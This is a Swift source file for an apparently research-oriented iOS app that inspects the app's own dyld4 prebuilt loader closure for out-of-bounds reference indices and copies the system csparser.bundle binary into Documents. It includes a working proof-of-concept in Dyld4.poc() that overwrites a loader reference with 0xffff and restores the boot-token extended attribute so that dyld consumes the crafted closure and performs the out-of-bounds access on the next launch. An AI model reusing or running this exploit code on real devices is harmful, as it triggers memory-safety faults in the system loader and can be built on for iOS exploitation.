//
//  ProbeMinimal.swift
//  dyld4 OOB + csparser collector — iOS 27.0.1 (24A446)
//
//  THREE JOBS ONLY:
//    1. Read the app's own dyld4 Prebuilt Loader Set and report whether dyld
//       performed an OOB access during startup (ref & 0x7fff >= count).
//    2. Try to read the system's csparser.bundle (a normal sandboxed app CAN
//       read /System/Library/Frameworks/... — no jailbreak needed) and save
//       the bytes into Documents so they can be pulled with AFC / Files.
//    3. Write a single report to Documents/probe-report.txt and copy it.
//
//  Everything else (entitlements, profiles, libmis, install, anchors,
//  slices, shell gates) was REMOVED by request.
//

import UIKit
import Foundation
import Darwin
import CryptoKit

// MARK: - small helpers

func hx(_ v: UInt64) -> String { String(format: "0x%016llx", v) }

func u32le(_ d: Data, _ o: Int) -> UInt32? {
    guard o >= 0, o + 4 <= d.count else { return nil }
    return d.withUnsafeBytes { $0.load(fromByteOffset: o, as: UInt32.self) }
}
func u16le(_ d: Data, _ o: Int) -> UInt16? {
    guard o >= 0, o + 2 <= d.count else { return nil }
    return d.withUnsafeBytes { $0.load(fromByteOffset: o, as: UInt16.self) }
}
func sha256hex(_ d: Data) -> String {
    // CryptoKit is available on iOS 16+; use it for a real hash.
    return SHA256.hash(data: d).map { String(format: "%02x", $0) }.joined()
}

// MARK: - dyld4 closure probe

struct LoaderProbe {
    var path = ""
    var size = 0
    var magicOK = false
    var versionOK = false
    var count: UInt32 = 0
    var arrayOff: UInt32 = 0
    var bootToken = ""
    var loaders = 0
    var offenders: [(index: Int, ref: UInt16, idx: Int)] = []
    var verdict = "NO-CLOSURE"
    var note = ""
}

enum Dyld4 {
    static let magic: UInt32 = 0x7370_3464
    static let version: UInt32 = 0x9593_b355

    static func dir() -> String {
        (NSHomeDirectory() as NSString).appendingPathComponent("Library/Caches/com.apple.dyld")
    }

    static func paths() -> [String] {
        guard let names = try? FileManager.default.contentsOfDirectory(atPath: dir()) else { return [] }
        return names.filter { $0.hasSuffix(".dyld4") }
            .map { (dir() as NSString).appendingPathComponent($0) }.sorted()
    }

    static func token(_ path: String) -> String {
        let n = "com.apple.dyld".withCString { getxattr(path, $0, nil, 0, 0, 0) }
        guard n > 0, n <= 256 else { return "-" }
        var buf = [CChar](repeating: 0, count: n + 1)
        let got = "com.apple.dyld".withCString { name in
            buf.withUnsafeMutableBytes { getxattr(path, name, $0.baseAddress, n, 0, 0) }
        }
        guard got > 0 else { return "-" }
        return Data(bytes: buf, count: got).map { String(format: "%02x", $0) }.joined()
    }

    static func inspect(_ path: String) -> LoaderProbe {
        var r = LoaderProbe(); r.path = path
        guard let d = FileManager.default.contents(atPath: path), d.count >= 0x14 else {
            r.note = "unreadable"; return r
        }
        r.size = d.count
        r.magicOK = u32le(d, 0) == magic
        r.versionOK = u32le(d, 4) == version
        r.bootToken = token(path)
        guard r.magicOK, r.versionOK,
              let count = u32le(d, 0xc), let off = u32le(d, 0x10) else {
            r.verdict = "BAD-HEADER"; return r
        }
        r.count = count; r.arrayOff = off
        let base = Int(off)
        for i in 0..<Int(count & 0xffff) {
            guard let lo = u32le(d, base + i * 4) else { break }
            let lp = base + Int(lo)
            guard let ref = u16le(d, lp + 6) else {
                r.offenders.append((i, 0, 0)); continue
            }
            let idx = Int(ref & 0x7fff)
            if idx >= Int(count) { r.offenders.append((i, ref, idx)) }
            r.loaders += 1
        }
        r.verdict = r.offenders.isEmpty ? "NO-OOB" : "OOB-CONFIRMED"
        r.note = "loaders=\(r.loaders) count=\(count) offenders=\(r.offenders.count)"
        return r
    }

    /// Opt-in PoC. A normal iOS app cannot posix_spawn its own executable
    /// (EPERM — measured on 27.0.1), so this is human-in-the-loop:
    ///   tap -> patch Ref to 0xffff + leave a backup
    ///        -> user force-quits and reopens the app
    ///        -> dyld validates the crafted closure at startup (the OOB)
    ///        -> next launch restores the original closure and reports.
    static func poc() -> String {
        guard let path = paths().first,
              let original = FileManager.default.contents(atPath: path),
              let count = u32le(original, 0xc),
              let off = u32le(original, 0x10),
              let first = u32le(original, Int(off)) else {
            return "PoC: no usable closure"
        }
        let refOff = Int(off) + Int(first) + 6
        guard refOff + 2 <= original.count else { return "PoC: bad ref offset" }
        let backup = path + ".probe-bak"
        try? original.write(to: URL(fileURLWithPath: backup), options: .atomic)
        var crafted = original
        crafted[refOff] = 0xff; crafted[refOff + 1] = 0xff
        guard (try? crafted.write(to: URL(fileURLWithPath: path), options: .atomic)) != nil else {
            return "PoC: patch write failed"
        }
        // .atomic replaces the file and drops its xattr; put the boot token
        // back or dyld will reject the closure before validating it.
        var tokenBuf = [CChar](repeating: 0, count: 256)
        let got = "com.apple.dyld".withCString { name in
            tokenBuf.withUnsafeBytes { raw -> Int in
                getxattr(backup, name, UnsafeMutableRawPointer(mutating: raw.baseAddress), 255, 0, 0)
            }
        }
        if got > 0 {
            _ = "com.apple.dyld".withCString { name in
                setxattr(path, name, &tokenBuf, got, 0, 0)
            }
        }
        return String(format: "PATCHED ref=0xffff count=%u token-restored=%d — FORCE-QUIT AND REOPEN", count, got)
    }

    /// Called at startup. If a PoC patch is pending, restore it and report
    /// that the app survived (or, if it did not, the crash log is the proof).
    @discardableResult
    static func finishPendingPoC() -> String? {
        guard let path = paths().first else { return nil }
        let backup = path + ".probe-bak"
        guard FileManager.default.fileExists(atPath: backup),
              let original = FileManager.default.contents(atPath: backup) else { return nil }
        // ★ Inspect the closure dyld just consumed, BEFORE restoring it.
        let seen = Dyld4.inspect(path)
        let evidence = String(format: "POC-SEEN-BY-DYLD count=%u ref=%@ idx=%@ verdict=%@ boot-token=%@",
                              seen.count,
                              seen.offenders.first.map { String(format: "0x%04x", $0.ref) } ?? "none",
                              seen.offenders.first.map { String($0.idx) } ?? "none",
                              seen.verdict, seen.bootToken)
        // restore body + xattr
        try? original.write(to: URL(fileURLWithPath: path), options: .atomic)
        var tokenBuf = [CChar](repeating: 0, count: 256)
        let got = "com.apple.dyld".withCString { name in
            tokenBuf.withUnsafeBytes { raw -> Int in
                getxattr(backup, name, UnsafeMutableRawPointer(mutating: raw.baseAddress), 255, 0, 0)
            }
        }
        if got > 0 {
            _ = "com.apple.dyld".withCString { name in setxattr(path, name, &tokenBuf, got, 0, 0) }
        }
        try? FileManager.default.removeItem(atPath: backup)
        return evidence + " ; RESTORED"
    }
}

// MARK: - csparser collector

enum CSParserCollector {
    static let candidates = [
        "/System/Library/Frameworks/Security.framework/PlugIns/csparser.bundle/csparser",
        "/System/Library/Frameworks/Security.framework/PlugIns/csparser.bundle",
        "/System/Library/Frameworks/Security.framework/Versions/A/PlugIns/csparser.bundle/csparser",
    ]

    struct Result {
        var path = ""
        var ok = false
        var size = 0
        var sha = ""
        var saved = ""
        var error = ""
    }

    static func collect() -> [Result] {
        var out: [Result] = []
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
        for (i, path) in candidates.enumerated() {
            var r = Result(); r.path = path
            // Distinguish ENOENT (file absent) from EPERM/EACCES (sandbox
            // blocks a file that does exist) — the two answers mean very
            // different things for the artifact-gap question.
            let fd = path.withCString { open($0, O_RDONLY) }
            if fd < 0 {
                let e = errno
                r.error = "errno=\(e) " + String(cString: strerror(e))
                out.append(r); continue
            }
            close(fd)
            guard let d = FileManager.default.contents(atPath: path) else {
                r.error = "open ok but read failed"
                out.append(r); continue
            }
            r.ok = true; r.size = d.count; r.sha = sha256hex(d)
            let dest = docs.appendingPathComponent("csparser-\(i).bin")
            if (try? d.write(to: dest, options: .atomic)) != nil {
                r.saved = dest.lastPathComponent
            } else {
                r.error = "read but save failed"
            }
            out.append(r)
        }
        return out
    }
}

// MARK: - report

final class Rep {
    private var lines: [String] = []
    private let url = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
        .appendingPathComponent("probe-report.txt")
    func add(_ s: String) {
        lines.append(s)
        if let h = FileHandle(forWritingAtPath: url.path) {
            h.seekToEndOfFile(); h.write(Data((s + "\n").utf8)); try? h.close()
        } else {
            try? (s + "\n").write(to: url, atomically: true, encoding: .utf8)
        }
    }
    func section(_ s: String) { add("--- \(s) ---") }
    var text: String { lines.joined(separator: "\n") + "\n" }
    var path: String { url.path }
}

@discardableResult
func runProbe() -> String {
    let r = Rep()
    r.add("probe=dyld4-oob+csparser")
    r.add("device-os=\(UIDevice.current.systemVersion)")
    r.add("utc=\(ISO8601DateFormatter().string(from: Date()))")
    r.add("home=\(NSHomeDirectory())")
    if let poc = Dyld4.finishPendingPoC() { r.add("poc-result=\(poc)") }

    r.section("DYLD4-OOB")
    let probes = Dyld4.paths().map { Dyld4.inspect($0) }
    for (i, p) in probes.enumerated() {
        r.add("dyld4[\(i)]-path=\(p.path)")
        r.add("dyld4[\(i)]-size=\(p.size)")
        r.add("dyld4[\(i)]-magic=\(p.magicOK ? "ok" : "bad")")
        r.add("dyld4[\(i)]-version=\(p.versionOK ? "ok" : "bad")")
        r.add("dyld4[\(i)]-count=\(p.count)")
        r.add("dyld4[\(i)]-array-off=\(p.arrayOff)")
        r.add("dyld4[\(i)]-boot-token=\(p.bootToken)")
        r.add("dyld4[\(i)]-loaders=\(p.loaders)")
        for o in p.offenders.prefix(8) {
            r.add("dyld4[\(i)]-oob=index=\(o.index) ref=0x\(String(format: "%04x", o.ref)) idx=\(o.idx) count=\(p.count)")
        }
        r.add("dyld4[\(i)]-verdict=\(p.verdict)")
        r.add("dyld4[\(i)]-note=\(p.note)")
    }
    if probes.isEmpty { r.add("dyld4-verdict=NO-CLOSURE") }

    r.section("CSPARSER")
    for c in CSParserCollector.collect() {
        r.add("csparser-path=\(c.path)")
        r.add("csparser-readable=\(c.ok ? "YES" : "no")")
        r.add("csparser-size=\(c.size)")
        r.add("csparser-sha256=\(c.sha)")
        r.add("csparser-saved=\(c.saved)")
        r.add("csparser-error=\(c.error)")
    }

    r.add("=== end ===")
    return r.text
}

// MARK: - UI (two buttons only)

final class VC: UIViewController {
    private let status = UILabel()
    private let runBtn = UIButton(type: .system)
    private let pocBtn = UIButton(type: .system)
    private let text = UITextView()
    private var report = ""

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground
        title = "dyld4 OOB"
        status.numberOfLines = 3; status.font = .systemFont(ofSize: 12)
        status.textAlignment = .center
        runBtn.setTitle("Run", for: .normal)
        runBtn.addTarget(self, action: #selector(run), for: .touchUpInside)
        pocBtn.setTitle("PoC OOB", for: .normal)
        pocBtn.addTarget(self, action: #selector(poc), for: .touchUpInside)
        text.isEditable = false
        text.font = UIFont.monospacedSystemFont(ofSize: 9, weight: .regular)
        let stack = UIStackView(arrangedSubviews: [status, runBtn, pocBtn, text])
        stack.axis = .vertical; stack.spacing = 8; stack.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(stack)
        NSLayoutConstraint.activate([
            stack.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 8),
            stack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 8),
            stack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -8),
            stack.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -8),
        ])
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) { self.run() }
    }

    @objc private func run() {
        runBtn.isEnabled = false
        status.text = "running…"
        DispatchQueue.global(qos: .userInitiated).async {
            let s = runProbe()
            DispatchQueue.main.async {
                self.report = s; self.text.text = s; self.runBtn.isEnabled = true
                self.status.text = "saved to Documents/probe-report.txt + csparser-*.bin"
                UIPasteboard.general.string = s
            }
        }
    }

    @objc private func poc() {
        pocBtn.isEnabled = false
        status.text = "patch → child → restore…"
        DispatchQueue.global(qos: .userInitiated).async {
            let s = Dyld4.poc()
            let r = Rep(); r.section("DYLD4-POC"); r.add("poc=\(s)")
            DispatchQueue.main.async {
                self.report += r.text; self.text.text += r.text
                self.status.text = s; self.pocBtn.isEnabled = true
                UIPasteboard.general.string = self.report
            }
        }
    }
}

@main
final class AppDelegate: UIResponder, UIApplicationDelegate {
    var window: UIWindow?
    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        let w = UIWindow(frame: UIScreen.main.bounds)
        w.rootViewController = UINavigationController(rootViewController: VC())
        w.makeKeyAndVisible(); window = w
        return true
    }
}
